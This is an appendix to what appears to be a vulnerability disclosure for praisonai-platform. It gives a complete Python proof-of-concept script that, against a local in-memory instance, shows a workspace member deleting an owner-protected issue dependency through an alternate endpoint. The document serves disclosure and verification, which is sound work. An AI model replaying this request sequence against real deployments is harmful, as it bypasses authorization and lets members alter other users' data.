  ## Appendix B - Full PoV Script

  Save this as `pov_platform_dependency_delete_bypass.py` before running the PoC commands above.

  ```python
  #!/usr/bin/env python3
  """PoV for PraisonAI Platform issue-dependency delete authorization."""

  from __future__ import annotations

  import argparse
  import asyncio
  import json
  import os
  import subprocess
  import sys
  from pathlib import Path
  from typing import Any


  def _load_local_source(repo: Path | None) -> None:
      if repo is None:
          return
      platform_root = repo / "src" / "praisonai-platform"
      agents_root = repo / "src" / "praisonai-agents"
      for path in (str(platform_root), str(agents_root)):
          if path not in sys.path:
              sys.path.insert(0, path)


  async def _register(client: Any, email: str, name: str) -> tuple[str, str]:
      response = await client.post(
          "/api/v1/auth/register",
          json={"email": email, "password": "Password1!", "name": name},
      )
      if response.status_code >= 400:
          raise RuntimeError(
              f"register failed for {email}: {response.status_code} {response.text}"
          )
      body = response.json()
      return body["token"], body["user"]["id"]


  async def _create_issue(
      client: Any,
      workspace_id: str,
      headers: dict[str, str],
      title: str,
  ) -> str:
      response = await client.post(
          f"/api/v1/workspaces/{workspace_id}/issues/",
          json={"title": title, "priority": "high"},
          headers=headers,
      )
      response.raise_for_status()
      return response.json()["id"]


  async def _run(repo: Path | None) -> dict[str, Any]:
      os.environ["PLATFORM_JWT_SECRET"] = "local-poc-secret-32-bytes-minimum"
      _load_local_source(repo)

      from httpx import ASGITransport, AsyncClient
      from sqlalchemy.ext.asyncio import create_async_engine

      from praisonai_platform.api.app import create_app
      from praisonai_platform.db import base as base_mod
      from praisonai_platform.db.base import Base, reset_engine

      await reset_engine()
      engine = create_async_engine(
          "sqlite+aiosqlite:///:memory:",
          echo=False,
          connect_args={"check_same_thread": False},
      )
      base_mod._engine = engine
      base_mod._session_factory = None
      async with engine.begin() as conn:
          await conn.run_sync(Base.metadata.create_all)

      app = create_app()
      transport = ASGITransport(app=app)
      async with AsyncClient(transport=transport, base_url="http://local-poc") as client:
          owner_token, owner_id = await _register(client, "owner@example.com", "Owner")
          member_token, member_id = await _register(client, "member@example.com", "Member")
          outsider_token, _ = await _register(client, "outsider@example.com", "Outsider")

          owner_headers = {"Authorization": f"Bearer {owner_token}"}
          member_headers = {"Authorization": f"Bearer {member_token}"}
          outsider_headers = {"Authorization": f"Bearer {outsider_token}"}

          ws_resp = await client.post(
              "/api/v1/workspaces/",
              json={"name": "Shared Workspace", "slug": "shared-workspace"},
              headers=owner_headers,
          )
          ws_resp.raise_for_status()
          workspace_id = ws_resp.json()["id"]

          add_member = await client.post(
              f"/api/v1/workspaces/{workspace_id}/members",
              json={"user_id": member_id, "role": "member"},
              headers=owner_headers,
          )
          add_member.raise_for_status()

          owner_issue_id = await _create_issue(
              client, workspace_id, owner_headers, "Owner-owned blocked issue"
          )
          member_issue_id = await _create_issue(
              client, workspace_id, member_headers, "Member-owned related issue"
          )

          dep_resp = await client.post(
              f"/api/v1/workspaces/{workspace_id}/issues/{owner_issue_id}/dependencies/",
              json={"depends_on_issue_id": member_issue_id, "type": "blocks"},
              headers=owner_headers,
          )
          dep_resp.raise_for_status()
          dep_id = dep_resp.json()["id"]

          member_delete_owner_endpoint = await client.delete(
              f"/api/v1/workspaces/{workspace_id}/issues/{owner_issue_id}/dependencies/{dep_id}",
              headers=member_headers,
          )
          member_delete_member_endpoint = await client.delete(
              f"/api/v1/workspaces/{workspace_id}/issues/{member_issue_id}/dependencies/{dep_id}",
              headers=member_headers,
          )
          owner_list_after_member_delete = await client.get(
              f"/api/v1/workspaces/{workspace_id}/issues/{owner_issue_id}/dependencies/",
              headers=owner_headers,
          )

          owner_issue_b = await _create_issue(
              client, workspace_id, owner_headers, "Owner issue B"
          )
          owner_issue_c = await _create_issue(
              client, workspace_id, owner_headers, "Owner issue C"
          )
          owner_only_dep_resp = await client.post(
              f"/api/v1/workspaces/{workspace_id}/issues/{owner_issue_b}/dependencies/",
              json={"depends_on_issue_id": owner_issue_c, "type": "blocks"},
              headers=owner_headers,
          )
          owner_only_dep_resp.raise_for_status()
          owner_only_dep_id = owner_only_dep_resp.json()["id"]
          member_delete_owner_only_dep = await client.delete(
              f"/api/v1/workspaces/{workspace_id}/issues/{owner_issue_b}/dependencies/{owner_only_dep_id}",
              headers=member_headers,
          )
          owner_delete_owner_only_dep = await client.delete(
              f"/api/v1/workspaces/{workspace_id}/issues/{owner_issue_b}/dependencies/{owner_only_dep_id}",
              headers=owner_headers,
          )

          outsider_create_dependency = await client.post(
              f"/api/v1/workspaces/{workspace_id}/issues/{owner_issue_id}/dependencies/",
              json={"depends_on_issue_id": member_issue_id, "type": "blocks"},
              headers=outsider_headers,
          )

          member_created_dep_resp = await client.post(
              f"/api/v1/workspaces/{workspace_id}/issues/{owner_issue_id}/dependencies/",
              json={"depends_on_issue_id": member_issue_id, "type": "related"},
              headers=member_headers,
          )
          if member_created_dep_resp.status_code == 201:
              member_created_dep_id = member_created_dep_resp.json()["id"]
              await client.delete(
                  f"/api/v1/workspaces/{workspace_id}/issues/{member_issue_id}/dependencies/{member_created_dep_id}",
                  headers=owner_headers,
              )

      await engine.dispose()
      base_mod._engine = None
      base_mod._session_factory = None

      dependencies_after_delete = (
          owner_list_after_member_delete.json()
          if owner_list_after_member_delete.status_code == 200
          else None
      )
      checks = {
          "member_delete_owner_issue_endpoint": member_delete_owner_endpoint.status_code,
          "member_delete_member_issue_endpoint": member_delete_member_endpoint.status_code,
          "owner_dependency_count_after_member_delete": (
              len(dependencies_after_delete) if dependencies_after_delete is not None else None
          ),
          "member_delete_owner_only_dependency": member_delete_owner_only_dep.status_code,
          "owner_delete_owner_only_dependency": owner_delete_owner_only_dep.status_code,
          "non_member_create_dependency": outsider_create_dependency.status_code,
          "member_create_dependency_on_owner_issue": member_created_dep_resp.status_code,
      }
      vulnerable = (
          checks["member_delete_owner_issue_endpoint"] == 403
          and checks["member_delete_member_issue_endpoint"] == 204
          and checks["owner_dependency_count_after_member_delete"] == 0
          and checks["member_delete_owner_only_dependency"] == 403
          and checks["owner_delete_owner_only_dependency"] == 204
          and checks["non_member_create_dependency"] == 403
          and checks["member_create_dependency_on_owner_issue"] == 201
      )
      return {
          "package": "praisonai-platform",
          "source": _source_id(repo),
          "workspace_role": "member",
          "summary": (
              "A workspace member can delete a dependency edge that protects an owner-created "
              "issue by addressing the same dependency through a member-owned related issue."
          ),
          "issue_ids": {
              "owner_issue": owner_issue_id,
              "member_issue": member_issue_id,
          },
          "dependency_id": dep_id,
          "checks": checks,
          "vulnerable": vulnerable,
      }


  def _source_id(repo: Path | None) -> str:
      if repo is None:
          import importlib.metadata

          return f"pypi:praisonai-platform=={importlib.metadata.version('praisonai-platform')}"
      rev = subprocess.check_output(
          ["git", "-C", str(repo), "rev-parse", "HEAD"],
          text=True,
      ).strip()
      return f"git:{rev}"


  def main() -> int:
      parser = argparse.ArgumentParser()
      parser.add_argument("--repo", type=Path)
      parser.add_argument("--json", action="store_true")
      args = parser.parse_args()

      result = asyncio.run(_run(args.repo.resolve() if args.repo else None))
      if args.json:
          print(json.dumps(result, indent=2, sort_keys=True))
      else:
          for key, value in result["checks"].items():
              print(f"{key}: {value}")
          print(f"vulnerable: {result['vulnerable']}")
      return 0 if result["vulnerable"] else 1


  if __name__ == "__main__":
      raise SystemExit(main())

  ```
